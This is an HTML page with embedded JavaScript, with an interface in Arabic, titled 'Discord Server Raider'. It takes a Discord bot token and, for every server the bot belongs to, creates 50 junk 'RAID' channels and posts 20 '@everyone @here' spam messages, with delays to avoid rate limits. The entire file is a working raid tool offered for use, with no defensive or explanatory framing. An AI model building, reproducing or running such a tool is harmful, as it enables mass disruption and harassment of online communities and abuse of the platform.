<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Discord Bot Raider</title>
    <style>
        body {
            background-color: #2f3136;
            color: #ffffff;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            margin: 0;
        }
        .container {
            background-color: #36393f;
            padding: 2rem;
            border-radius: 10px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.5);
            width: 90%;
            max-width: 600px;
            text-align: center;
        }
        h1 { margin-bottom: 1.5rem; color: #7289da; }
        input[type="text"] {
            width: 80%;
            padding: 10px;
            border-radius: 5px;
            border: none;
            margin-bottom: 1rem;
            background-color: #40444b;
            color: white;
            outline: none;
        }
        button {
            background-color: #7289da;
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
            transition: 0.3s;
        }
        button:hover { background-color: #5b6eae; }
        button:disabled { background-color: #475563; cursor: not-allowed; }
        
        .log-box {
            margin-top: 20px;
            background-color: #202225;
            height: 200px;
            overflow-y: auto;
            padding: 10px;
            text-align: left;
            direction: ltr;
            border-radius: 5px;
            font-family: monospace;
            font-size: 12px;
            color: #aaa;
            border: 1px solid #4f545c;
        }
        .log-entry { margin: 2px 0; }
        .success { color: #43b581; }
        .error { color: #f04747; }
        .info { color: #faa61a; }
    </style>
</head>
<body>

<div class="container">
    <h1>🤖 Discord Server Raider</h1>
    <p>أدخل التوكن (Token) الخاص بالبوت:</p>
    <input type="text" id="tokenInput" placeholder="حط التوكن هنا...">
    <button id="startBtn" onclick="startRaid()">ابدأ الجحفلة</button>

    <div class="log-box" id="logs"></div>
</div>

<script>
    const logsDiv = document.getElementById('logs');
    
    function log(msg, type = '') {
        const div = document.createElement('div');
        div.className = `log-entry ${type}`;
        div.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
        logsDiv.prepend(div);
    }

    async function startRaid() {
        const token = document.getElementById('tokenInput').value.trim();
        if (!token) {
            alert("الرجاء إدخال التوكن!");
            return;
        }

        const btn = document.getElementById('startBtn');
        btn.disabled = true;
        log("جاري الاتصال بـ Discord API...", "info");

        try {
            // 1. التحقق من صحة التوكن وجلب السيرفرات
            const userRes = await fetch("https://discord.com/api/v9/users/@me", {
                headers: { Authorization: token }
            });
            
            if (!userRes.ok) throw new Error("التوكن غير صالح أو منتهي الصلاحية.");
            
            const userServersRes = await fetch("https://discord.com/api/v9/users/@me/guilds", {
                headers: { Authorization: token }
            });
            const guilds = await userServersRes.json();

            if (guilds.length === 0) {
                throw new Error("البوت لا يوجد في أي سيرفرات!");
            }

            log(`تم الدخول! البوت موجود في ${guilds.length} سيرفر.`, "success");

            // 2. حلقة الجحفلة لكل سيرفر
            for (const guild of guilds) {
                log(`--- جاري الهجوم على السيرفر: ${guild.name} (${guild.id}) ---`, "info");
                
                // محاولة الوصول للسيرفر للتأكد من الصلاحيات
                const checkGuild = await fetch(`https://discord.com/api/v9/guilds/${guild.id}`, {
                    headers: { Authorization: token }
                });

                if (checkGuild.status === 403) {
                    log(`❌ البوت مغلق من هذا السيرفر أو لا يملك صلاحيات.`, "error");
                    continue;
                }

                // أ) جحفلة القنوات (Spam Channels)
                await raidChannels(guild.id, token);

                // ب) البحث عن قناة ونشر سبام (Spam Mention)
                await raidChat(guild.id, token);
            }

            log("✅ انتهت الجحفلة لجميع السيرفرات!", "success");

        } catch (err) {
            log(`❌ خطأ: ${err.message}`, "error");
        } finally {
            btn.disabled = false;
        }
    }

    async function raidChannels(guildId, token) {
        const channelCount = 50; // عدد القنوات المراد إنشائها
        log(`⚡ جاري إنشاء ${channelCount} قناة...`);

        for (let i = 0; i < channelCount; i++) {
            try {
                await fetch(`https://discord.com/api/v9/guilds/${guildId}/channels`, {
                    method: "POST",
                    headers: { 
                        "Authorization": token,
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify({
                        name: `RAID-${i}-${Math.random().toString(36).substr(2, 5)}`,
                        type: 0 // Text Channel
                    })
                });
                // تأخير بسيط لتجنب Rate Limit
                await new Promise(r => setTimeout(r, 100)); 
            } catch (e) {
                // تجاهل الأخطاء الفردية للمتابعة
            }
        }
        log(`✅ تم إنشاء ${channelCount} قناة بنجاح.`);
    }

    async function raidChat(guildId, token) {
        try {
            // جلب القنوات
            const channelsRes = await fetch(`https://discord.com/api/v9/guilds/${guildId}/channels`, {
                headers: { Authorization: token }
            });
            const channels = await channelsRes.json();

            // تصفية القنوات النصية فقط
            const textChannels = channels.filter(ch => ch.type === 0);
            
            if (textChannels.length === 0) {
                log("لا توجد قنوات نصية في هذا السيرفر.", "error");
                return;
            }

            // اختيار قناة عشوائية
            const randomChannel = textChannels[Math.floor(Math.random() * textChannels.length)];
            log(`📢 جاري نشر السبام في قناة: #${randomChannel.name}`);

            // إرسال رسائل سبام
            const spamCount = 20;
            for(let i=0; i<spamCount; i++) {
                await fetch(`https://discord.com/api/v9/channels/${randomChannel.id}/messages`, {
                    method: "POST",
                    headers: { 
                        "Authorization": token,
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify({
                        content: "@everyone @here جحفلة! " + Math.floor(Math.random() * 1000)
                    })
                });
                await new Promise(r => setTimeout(r, 200)); // انتظار بين الرسائل
            }
            log(`📨 تم إرسال ${spamCount} رسالة mentions.`);

        } catch (e) {
            log("فشل في إرسال السبام (قد يكون بسبب Rate Limit).", "error");
        }
    }
</script>

</body>
</html>
